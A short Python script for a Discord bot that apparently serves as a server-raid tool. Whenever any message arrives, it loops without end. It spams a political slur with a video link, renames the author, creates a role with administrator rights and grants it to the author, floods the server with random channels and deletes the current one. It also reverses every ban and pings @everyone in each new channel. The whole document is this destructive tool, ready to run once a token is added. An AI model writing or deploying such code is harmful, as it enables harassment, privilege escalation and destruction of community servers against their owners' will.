import os
import discord
import time
import random
import string
from discord.utils import get

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

TOKEN = ("enter your bot token here")

client=discord.Client()

@client.event
async def on_ready():
    print('connected to Discord!')

@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")
    
@client.event
async def on_message(message):
    response = 'DIE NAZI SCUM https://cdn.discordapp.com/attachments/796464234032136242/827273802152280134/Soviet_Power.mp4'
    x=100
    while int(x)==100:
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=randomletters(3))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        await guild.create_text_channel(randomletters(99))
        await guild.create_text_channel(randomletters(99))
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        
@client.event
async def on_guild_channel_create(channel):
    await channel.send("ML BATTALION HAS RISEN, DIE NAZI SCUM @everyone")

client.run(TOKEN)
